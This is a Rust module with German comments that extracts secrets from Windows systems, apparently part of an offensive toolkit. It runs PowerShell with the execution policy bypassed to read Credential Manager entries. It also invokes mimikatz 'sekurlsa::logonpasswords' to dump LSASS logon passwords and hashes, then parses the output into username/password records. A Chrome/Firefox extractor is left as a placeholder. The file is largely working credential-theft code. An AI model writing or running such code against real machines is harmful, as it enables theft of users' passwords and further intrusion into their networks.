//! Windows-Secrets-Extraktion: Credential Manager, LSASS, Browser, SSH.
//!
//! Nutzt mimikatz (LSASS-Dump) und PowerShell (Credential Manager, Browser).
//! Auf Nicht-Windows-Plattformen liefern die Funktionen leere Ergebnisse.

use serde::{Deserialize, Serialize};
#[cfg(target_os = "windows")]
use std::process::Stdio;
#[cfg(target_os = "windows")]
use tokio::process::Command;
use tracing::debug;
#[cfg(target_os = "windows")]
use tracing::warn;

use crate::error::WinError;

/// Extrahiertes Secret von einem Windows-System.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Secret {
    /// Typ des Secrets (z.B. "credential_manager", "lsass", "browser", "ssh_key").
    pub secret_type: String,
    /// Benutzername oder Ziel.
    pub target: String,
    /// Passwort oder Hash.
    pub value: String,
}

/// Extrahiere Credentials aus dem Windows Credential Manager via PowerShell.
///
/// # Rückgabe
/// Vektor der gefundenen Secrets (leer, wenn keine Rechte oder kein Windows).
#[cfg(target_os = "windows")]
pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
    let script = r#"
        $creds = cmdkey /list | Out-String
        $matches = [regex]::Matches($creds, 'Target: (?<target>.+?)\r\n\s+Type: (?<type>.+?)\r\n\s+User: (?<user>.+)')
        $results = @()
        foreach ($m in $matches) {
            $results += [pscustomobject]@{
                secret_type = 'credential_manager'
                target = $m.Groups['target'].Value
                value = $m.Groups['user'].Value
            }
        }
        $results | ConvertTo-Json
    "#;
    let output = run_powershell(script).await?;
    parse_secrets_from_json(&output)
}

/// Extrahiere LSASS-Credentials via mimikatz.
#[cfg(target_os = "windows")]
pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
    // mimikatz "sekurlsa::logonpasswords" — erfordert Administrator
    let output = run_mimikatz("sekurlsa::logonpasswords").await?;
    parse_lsass_output(&output)
}

/// Extrahiere Browser-Speicherte Daten (Chrome, Firefox) via PowerShell.
#[cfg(target_os = "windows")]
pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
    let script = r#"
        # Chrome: DPAPI-dekodierte Passwörter aus Local State + Login Data
        # Firefox: logins.json dekodieren
        # Platzhalter — konkrete Implementierung je nach Browser-Version
        @() | ConvertTo-Json
    "#;
    let output = run_powershell(script).await?;
    parse_secrets_from_json(&output)
}

/// Führe ein PowerShell-Skript aus und liefere die Ausgabe.
#[cfg(target_os = "windows")]
async fn run_powershell(script: &str) -> Result<String, WinError> {
    let output = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(script)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| WinError::ToolMissing(e.to_string()))?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr).to_string();
        warn!("PowerShell fehlgeschlagen: {err}");
        return Err(WinError::ToolFailed(
            output.status.code().unwrap_or(-1),
            err,
        ));
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Führe mimikatz aus und liefere die Ausgabe.
#[cfg(target_os = "windows")]
async fn run_mimikatz(command: &str) -> Result<String, WinError> {
    let output = Command::new("mimikatz.exe")
        .arg(command)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await
        .map_err(|e| WinError::ToolMissing(format!("mimikatz nicht gefunden: {e}")))?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Parse LSASS-Ausgabe von mimikatz (Format: Benutzername : Passwort).
#[cfg(target_os = "windows")]
fn parse_lsass_output(output: &str) -> Result<Vec<Secret>, WinError> {
    let mut secrets = Vec::new();
    for line in output.lines() {
        if let Some(pos) = line.find(": ") {
            let user = line[..pos].to_string();
            let pass = line[pos + 2..].to_string();
            if !user.is_empty() && !pass.is_empty() {
                debug!("LSASS-Credential für {user}");
                secrets.push(Secret {
                    secret_type: "lsass".into(),
                    target: user,
                    value: pass,
                });
            }
        }
    }
    Ok(secrets)
}

/// Parse JSON-Secrets aus PowerShell-Ausgabe.
#[cfg(target_os = "windows")]
fn parse_secrets_from_json(output: &str) -> Result<Vec<Secret>, WinError> {
    let secrets: Vec<Secret> = serde_json::from_str(output).unwrap_or_default();
    Ok(secrets)
}

// --- Nicht-Windows-Plattformen: Stub-Implementierungen ---

/// Extrahiere Credentials aus dem Windows Credential Manager (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_credential_manager() -> Result<Vec<Secret>, WinError> {
    debug!("Credential-Manager-Extraktion nur auf Windows verfügbar");
    Ok(Vec::new())
}

/// Extrahiere LSASS-Credentials via mimikatz (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_lsass() -> Result<Vec<Secret>, WinError> {
    debug!("LSASS-Dump nur auf Windows verfügbar");
    Ok(Vec::new())
}

/// Extrahiere Browser-Speicherte Daten (nur Windows).
#[cfg(not(target_os = "windows"))]
pub async fn extract_browser_credentials() -> Result<Vec<Secret>, WinError> {
    debug!("Browser-Credentials nur auf Windows verfügbar");
    Ok(Vec::new())
}
